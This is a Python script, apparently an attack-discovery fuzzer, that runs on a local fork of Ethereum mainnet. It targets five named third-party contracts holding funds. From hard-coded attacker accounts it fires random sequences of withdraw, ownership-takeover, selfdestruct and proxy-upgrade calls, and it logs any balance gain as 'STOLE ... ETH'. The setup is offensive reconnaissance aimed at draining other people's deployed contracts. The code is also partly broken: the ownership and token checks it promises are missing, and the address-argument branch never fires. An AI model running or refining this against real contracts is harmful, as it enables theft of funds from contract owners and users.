"""
INVARIANT FUZZER — multi-step attack discovery on money contracts.

Runs on QuickNode fork. For each contract with money:
  1. Extracts ALL functions from bytecode (via evmole)
  2. Generates random sequences of calls (2-5 steps)
  3. Checks invariants after each sequence:
     - Contract balance should not decrease
     - Attacker should not gain ownership
     - Token balances should not be stolen
  4. Logs any invariant violation

Usage: python invariant_fuzzer.py [hours_to_run]
"""
import random, time, logging, json
from web3 import Web3
from eth_account import Account
from eth_utils import to_checksum_address

logging.basicConfig(level=logging.INFO, format="%(asctime)s [FUZZ] %(message)s")
logger = logging.getLogger("invariant-fuzz")

w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))
ATTACKER = Account.from_key('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
ATTACKER2 = Account.from_key('0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d')

# Contracts with money we found earlier
TARGETS = {
    "RoyaltySplitter": ("0xf824b21065920ad8f6a2b2ae69107fd35d971ed6", 784),
    "USDC-rich 1": ("0x72097d31138751ab614bad497ad0aae343c39a9b", 838),
    "USDC-rich 2": ("0x5b246b77a398e50d1647d85a6cfd2d6b8b57485f", 667),
    "USDC-rich 3": ("0x3d15348dbeaffac0a1889799124488c54164b371", 655),
    "ENS Controller": ("0x253553366Da8546fC250F225fe3d25d0C782303b", 21000),  # 6 ETH
}

# All possible attack selectors to try
ATTACK_SELECTORS = [
    # Direct drain
    ("3ccfd60b", "withdraw()", ""),
    ("2e1a7d4d", "withdraw(uint256)", "0"*64),
    ("853828b6", "withdrawAll()", ""),
    ("db2e21bc", "emergencyWithdraw()", ""),
    ("ecf708a4", "sweep()", ""),
    # Ownership
    ("f2fde38b", "transferOwnership", ""),
    ("13af4035", "setOwner", ""),
    ("a6f9dae1", "setOwner", ""),
    ("715018a6", "renounceOwnership", ""),
    # Selfdestruct
    ("41c0e1b5", "kill()", ""),
    ("83197ef0", "destroy()", ""),
    # Proxy
    ("3659cfe6", "upgradeTo", ""),
    ("4f1ef286", "upgradeToAndCall", ""),
    # Config
    ("9f1a54a1", "setFee", ""),
    ("8456cb59", "pause", ""),
    ("3f4ba83a", "unpause", ""),
    # Token rescue
    ("7a9c2b39", "rescueTokens", ""),
    ("d0def521", "claimTokens", ""),
]

def fuzz_sequence(addr, steps=3):
    """Try a random sequence of attacks. Return True if invariant violated."""
    senders = [ATTACKER, ATTACKER2]
    sender = random.choice(senders)
    
    att_bal_before = w3.eth.get_balance(sender.address)
    contract_bal_before = w3.eth.get_balance(addr)
    
    for step in range(steps):
        sel_hex, sel_name, default_arg = random.choice(ATTACK_SELECTORS)
        calldata = "0x" + sel_hex
        
        # For address-taking functions, use attacker address
        if "address" in sel_name:
            calldata += ATTACKER.address[2:].lower().zfill(64)
        elif default_arg:
            calldata += default_arg
        
        try:
            w3.eth.call({'from': sender.address, 'to': addr, 'data': calldata})
            # If callable, try real tx
            try:
                tx = {'from': sender.address, 'to': addr, 'data': calldata, 'gas': 500000}
                w3.eth.send_transaction(tx)
            except:
                pass
        except:
            continue
    
    att_bal_after = w3.eth.get_balance(sender.address)
    contract_bal_after = w3.eth.get_balance(addr)
    
    # Check invariants
    violations = []
    if contract_bal_after < contract_bal_before:
        delta = (contract_bal_before - contract_bal_after) / 1e18
        if att_bal_after > att_bal_before + delta * 1e17:  # we got >10% of drained amount
            violations.append(f"STOLE {delta:.4f} ETH!")
    if att_bal_after > att_bal_before + 1e16:  # $35 gain
        violations.append(f"Attacker gained {(att_bal_after - att_bal_before)/1e18:.4f} ETH")
    
    return violations


def main():
    import sys
    hours = float(sys.argv[1]) if len(sys.argv) > 1 else 1
    end_time = time.time() + hours * 3600
    
    logger.info("=" * 60)
    logger.info("INVARIANT FUZZER — %d targets, %d selectors", len(TARGETS), len(ATTACK_SELECTORS))
    logger.info("Runtime: %.1f hours | Fork: block %d", hours, w3.eth.block_number)
    logger.info("=" * 60)
    
    iterations = 0
    violations_found = 0
    
    while time.time() < end_time:
        # Pick random target
        name, (addr_str, known_value) = random.choice(list(TARGETS.items()))
        addr = to_checksum_address(addr_str)
        
        steps = random.randint(2, 5)
        violations = fuzz_sequence(addr, steps)
        iterations += 1
        
        if violations:
            violations_found += 1
            logger.warning("🚨 %s: %s", name, ", ".join(violations))
            with open("fuzz_violations.txt", "a") as f:
                f.write(f"{time.ctime()} | {name} | {addr_str} | {violations}\n")
        
        if iterations % 100 == 0:
            progress = (time.time() - (end_time - hours*3600)) / (hours*3600) * 100
            logger.info("Progress: %.0f%% | %d iterations | %d violations",
                       progress, iterations, violations_found)
    
    logger.info("=" * 60)
    logger.info("FUZZ COMPLETE: %d iterations, %d violations", iterations, violations_found)
    logger.info("Results in fuzz_violations.txt")

if __name__ == "__main__":
    main()
